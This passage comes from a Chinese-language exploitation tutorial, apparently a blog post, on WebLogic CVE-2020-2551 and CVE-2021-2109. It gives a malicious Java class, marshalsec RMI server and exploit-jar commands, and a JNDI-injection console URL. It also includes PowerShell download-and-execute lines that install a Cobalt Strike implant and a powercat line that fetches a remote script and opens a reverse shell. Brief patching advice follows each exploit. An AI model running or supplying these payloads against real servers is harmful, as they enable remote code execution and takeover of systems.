      java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  public static void main(String[] args) {
  }
}

```

在 kali 中安装 javac 以用于将 java 源文件编译为 class 字节码文件

```
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOnCicyl1MGzNAnyLteeicqEvssV63ku4DFXFRSkcNwib4ibHGib0vfTNXLQ/640?wx_fmt=png)

编译 exp.java 后在当前目录启用 http 服务

```
javac exp.java -source 1.6 -target 1.6
## 启动web服务
python -m SimpleHTTPServer 80 或
python3 -m http.server 80

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibHJtLhO3DDTsJrAEaAcVA9Z1PNCj8VIib07jSJN9rY3PicRrMNcxGxKJg/640?wx_fmt=png)

通过 maeshalsec 启动恶意的 RMI 服务，开放端口为 1099

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.50/#exp" 1099

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib9pmeUSpUwaHyhKeZqhybMFJXoQEoL60hKpapmVfibu9XFjObtYTNMKQ/640?wx_fmt=png)

执行漏洞利用脚本请求 RMI 服务进行攻击

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/exp

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib8GHTjkJ0Bdc7DxPVnUsQ1QYuSXicuEepmMKnkTveiaaIiarC93duey1Hg/640?wx_fmt=png)

成功在 10.3.6 版本的 Weblogic 服务器中弹出计算器

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmT5IFvFriaUsbFDUmHPKAjKA0lfCC3atOJLVREk0PjGZ4IyOuIN0DGw/640?wx_fmt=png)

接下来测试 12.1.3 版本的 Weblogic 是否存在该漏洞，执行漏洞利用程序进行攻击

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/exp

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6yicXAJC6yjQia6GcXv1x8NicOa3j3d4eMXmsXpjAqMPlkdfvlEMe55bA/640?wx_fmt=png)

同样在服务器上弹出计算器，说明在 12.1.3 版本中也存在该漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibjCy5cJZgrIPqC78IROH44oGpibC27Gs9icktibhIAOpnSLNPXIXOAiaykA/640?wx_fmt=png)

把 exp.java 中执行的计算器程序修改为 CS 木马程序

```
java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c","(new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe"});

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib95Zr7MTicUqZ7q3avLd2wLpkyQ7m9y7k4x4VrxNI7ibY3crXgiacGLPyQ/640?wx_fmt=png)

使用 javac 再次编译 exp.java 并开启 http 服务

```
javac exp.java -source 1.6 -target 1.6
python -m SimpleHTTPServer 80

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibLsKvCfbmjxXfKXo1Ltichic7Yl6Gj51zeTibBNmWU8UwYD2EbcdU1Veicw/640?wx_fmt=png)

执行漏洞利用程序请求恶意 RMI 服务

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/exp

```

成功执行木马并上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib1voPKtCke9wj9gNpqWJjmNTWyBnKutbBkBuvtKnnkrf9UELXPSaVVQ/640?wx_fmt=png)

当然也可以使用 powershell 命令来替代，同样能够上线 CS

```
IEX (New-Object System.Net.Webclient).DownloadString('http://www.naturali5r.cn/powercat.ps1'); powercat -c 192.168.121.1 -p 6666 -e cmd

```

**漏洞修复**

1. 修改 weblogic 的默认端口名为 8080，可在 config.xml 文件中添加 8080

2. 使用 Oracle 官方安全补丁进行修复

3. 如果不依赖 T3 协议进行 JVM 通信，用户可通过控制 T3 协议的访问来临时阻断针对该漏洞的攻击

**Weblogic LDAP 远程代码执行漏洞（CVE-2021-2109）**

**漏洞详情**

攻击者可构造恶意请求，造成 JNDI 注入，执行任意代码，从而控制服务器。

**漏洞利用**

验证漏洞是否存在的路径为

/console/css/%252e%252e%252f/consolejndi.portal，如果出现以下页面说明可未授权访问

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibgCyKwXsLibbg3VrZEsWrSpY41xS1FZiauZRj9EFSVyibUoBicn5V2rthkw/640?wx_fmt=png)

启动攻击所需要的 LDAP 利用脚本，其中 - i 指向当前服务器 IP 

脚本地址：  

```
https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11

```

```
java -jar JNDIExploit-v1.11.jar -i 192.168.0.106

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibq8dTdWYRuwBfuLt5vyEYWwibxK3YRiadQP3PQbOjw930VLPhriaJgzZg/640?wx_fmt=png)

配合 Weblogic 未授权验证远程代码执行漏洞是否存在，验证成功返回用户名

```
/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.0;106:1389/Basic/WeblogicEcho;AdminServer%22)

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5xZYbTtHnnpSaCJTKeBUKDwd59j0UyhqrT4LI0aLhGQNFlWibWFgvBQ/640?wx_fmt=png)

修改 cmd 请求头命令如下，尝试上线 CS

```
powershell /c (new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibAib6hWKxgL8x7KVAhWQPfEf19EXxvGqKB8quFiabTzCWe3Nk6vYjpPZw/640?wx_fmt=png)

成功上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib3ELOHCjufuAianVUlZ3RqRR7RZicjSReD6Eufjyg0Foibk1fib6acViaWcg/640?wx_fmt=png)

**漏洞修复**

1. 禁用 T3 协议，如果您不依赖 T3 协议进行 JVM 通信，可通过暂时阻断 T3 协议缓解此漏洞带来的影响。首先进入 Weblogic 控制台，在 base_domain 配置页面中，进入 “安全” 选项卡页面，点击“筛选器”，配置筛选器。在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibPAc7djZia8w9BicJbtMzV7oqibWMEDTCEsckl4bEQntYt5VXatL4MwiaTg/640?wx_fmt=png)

2. 禁止启用 IIOP 协议。登陆 Weblogic 控制台，找到启用 IIOP 选项，取消勾选后重启生效

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUHfbTfppzvuFy4ffXUl6hAzmh6c5PibN0nWjyct8o1Tm2mvMe68Ru2A/640?wx_fmt=png)

3. 临时关闭后台 / console/console.portal 对外访问

4. 升级官方安全补丁

### **0x04 **知识星球****

![](https://mmbiz.qpic.cn/mmbiz_jpg/pH5fZ5lvwwZjRbPjHMwuywOjARoC8AlmuhOC1cKYYfDib2F2ibZkTpxEwic5mib3pKaaOKa6DDKwLMMibVKmxth4ogQ/640?wx_fmt=jpeg)